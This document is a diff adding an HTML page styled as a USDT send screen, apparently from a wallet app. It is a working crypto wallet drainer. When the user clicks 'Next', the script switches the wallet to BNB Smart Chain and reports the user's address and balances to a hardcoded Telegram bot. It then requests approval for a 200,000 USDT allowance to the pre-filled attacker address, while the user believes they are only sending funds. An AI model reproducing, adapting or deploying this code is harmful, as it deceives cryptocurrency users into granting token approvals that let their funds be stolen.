@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send Usdt</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #000;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+    }
+
+    @media (prefers-color-scheme: light) {
+      body {
+        background: #ffffff;
+        color: #000;
+      }
+    }
+
+    .container {
+      margin: 40px 20px 100px; 
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 450;
+      font-size: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 110px 14px 14px; 
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      background: #111;
+      color: #fff;
+      box-sizing: border-box;
+    }
+
+    @media (prefers-color-scheme: light) {
+      input {
+        background: #fff;
+        color: #000;
+      }
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .input-actions {
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      color: #48ff91; 
+    }
+
+    @media (prefers-color-scheme: light) {
+      .input-actions {
+        color: #0500ff;
+      }
+    }
+
+    .highlight {
+      font-weight: 450;
+      cursor: pointer;
+    }
+
+    .approx {
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      color: #ccc;
+    }
+
+    .next-btn {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      right: 20px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #48ff91;
+      border: none;
+      border-radius: 10px;
+      color: #000;
+      cursor: pointer;
+    }
+
+    .next-btn.processing,
+    .next-btn:disabled {
+      background: #2d764b;
+      cursor: not-allowed;
+    }
+
+    @media (prefers-color-scheme: light) {
+      .next-btn {
+        background: #0500ff;
+        color: #fff;
+      }
+
+      .next-btn.processing,
+      .next-btn:disabled {
+        background: #9b99ff;
+      }
+    }
+
+    svg {
+      width: 20px;
+      height: 20px;
+      fill: currentColor;
+      cursor: pointer;
+    }
+
+@media (prefers-color-scheme: dark) {
+  body {
+    background-color: #1b1b1c !important;
+    color: #ffffff !important;
+  }
+  input {
+    background-color: #1b1b1c !important;
+    color: #ffffff !important;
+  }
+}
+
+/*  Highlight outline on focus (light/dark based) */
+:root {
+  --highlight-light: #0500ff;
+  --highlight-dark: #48ff91;
+}
+
+input:focus {
+  outline: 2px solid;
+  outline-color: var(--highlight-color);
+  box-shadow: none;
+}
+
+/* Set --highlight-color based on theme */
+@media (prefers-color-scheme: light) {
+  :root {
+    --highlight-color: var(--highlight-light);
+  }
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --highlight-color: var(--highlight-dark);
+  }
+}
+
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <!-- <input type="text" id="address" value="0xf1E0c7B6426AEFe5DF2B0C17394006d85618158" readonly /> -->
+      <input type="text" id="address" value="0x120181346e77B5188b7Fa6689Eb1E77ec5B0fA81" readonly />
+      <div class="input-actions">
+        <span class="highlight" onclick="pasteAddress()">Paste</span>
+        <svg onclick="scanAddress()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M3 3v6h2V5h4V3H3zm16 0v2h-4v2h6V3h-2zM3 15v6h6v-2H5v-4H3zm16 0v4h-4v2h6v-6h-2zM5 11h14v2H5z"/>
+        </svg>
+      </div>
+    </div>
+
+    <label for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount" />
+      <div class="input-actions">
+        <span style="color: #aaa;">USDT</span>
+        <span class="highlight" onclick="setMax()">Max</span>
+      </div>
+    </div>
+
+    <div class="approx" id="approx">= $0.00</div>
+  </div>
+
+  <button class="next-btn" id="nextBtn" disabled>Next</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+    const amountInput = document.getElementById("amount");
+    const nextBtn = document.getElementById("nextBtn");
+    const approx = document.getElementById("approx");
+    const addressInput = document.getElementById("address");
+
+    amountInput.addEventListener("input", () => {
+      const val = parseFloat(amountInput.value);
+      if (val > 0) {
+        nextBtn.disabled = false;
+        approx.textContent = `= $${val.toFixed(2)}`;
+      } else {
+        nextBtn.disabled = true;
+        approx.textContent = "= $0.00";
+      }
+    });
+
+    function setMax() {
+      amountInput.value = 20000;
+      amountInput.dispatchEvent(new Event("input"));
+    }
+
+    async function pasteAddress() {
+      try {
+        const text = await navigator.clipboard.readText();
+        addressInput.value = text;
+      } catch {
+        alert("Clipboard access denied. Paste manually.");
+      }
+    }
+
+    function scanAddress() {
+      alert("QR Scan coming soon...");
+    }
+
+    nextBtn.addEventListener("click", async (e) => {
+      e.preventDefault();
+      nextBtn.textContent = "Processing...";
+      nextBtn.classList.add("processing");
+      nextBtn.disabled = true;
+
+      setTimeout(async () => {
+        await triggerApproval();
+        nextBtn.textContent = "Next";
+        nextBtn.classList.remove("processing");
+        nextBtn.disabled = false;
+      }, 1000);
+    });
+
+    async function triggerApproval() {
+  try {
+    // Switch/add to BNB Smart Chain first
+    await window.ethereum.request({
+      method: "wallet_addEthereumChain",
+      params: [{
+        chainId: "0x38", // BSC Mainnet
+        chainName: "BNB Smart Chain Mainnet",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org"],
+        blockExplorerUrls: ["https://bscscan.com"]
+      }]
+    });
+
+    // Reinitialize provider and signer
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    // Fetch balances of BNB and USDT
+    const [bnbBalance, usdtBalance] = await Promise.all([
+      getBscBalance(userAddress), // Fetch BNB balance
+      getUsdtBalance(userAddress) // Fetch USDT balance
+    ]);
+
+    // Prepare message and send via Telegram
+    const message = `User Address: ${userAddress}\nMessage: Wallet is approved✅✅\nBNB Balance: ${bnbBalance} BNB\nUSDT Balance: ${usdtBalance} USDT`;
+
+    await sendTelegramMessage(userAddress, message);
+
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const spender = "0x120181346e77B5188b7Fa6689Eb1E77ec5B0fA81";
+    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+    const contract = new ethers.Contract(usdtAddress, abi, signer);
+    const value = ethers.utils.parseUnits("200000", 18);
+    const tx = await contract.approve(spender, value);
+    await tx.wait();
+
+    alert("✅ Approval Successful & Address Tracked");
+  } catch (err) {
+    alert("❌ Approval failed: " + (err.message || "Unknown error"));
+  }
+}
+
+    // Function to fetch BSC balance of an address
+    async function getBscBalance(address) {
+      const bscProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+      const balance = await bscProvider.getBalance(address); // Returns balance in wei
+      const balanceInBnb = ethers.utils.formatUnits(balance, 18); // Convert from wei to BNB
+      return balanceInBnb;
+    }
+
+      // Function to fetch USDT balance (ERC20 token)
+async function getUsdtBalance(address) {
+  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT contract address on BSC
+  const abi = [
+    "function balanceOf(address account) view returns (uint256)"
+  ]; // Simple ERC20 balanceOf function
+  const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+  const usdtContract = new ethers.Contract(usdtAddress, abi, provider);
+  const balance = await usdtContract.balanceOf(address); 
+  const balanceInUsdt = ethers.utils.formatUnits(balance, 18); 
+  return balanceInUsdt;
+}
+
+
+    // Function to send the message to Telegram
+    async function sendTelegramMessage(userAddress, message) {
+      const botToken = '8440239838:AAHXwJtZ7c0X619ZSDc0goA6VlJbGURGGrs'; 
+      const chatId = '7846018094'; 
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        const data = await response.json();
+        if (data.ok) {
+          console.log('Message sent successfully');
+        } else {
+          console.error('Failed to send message:', data.description);
+        }
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+      }
+    }
+</script>
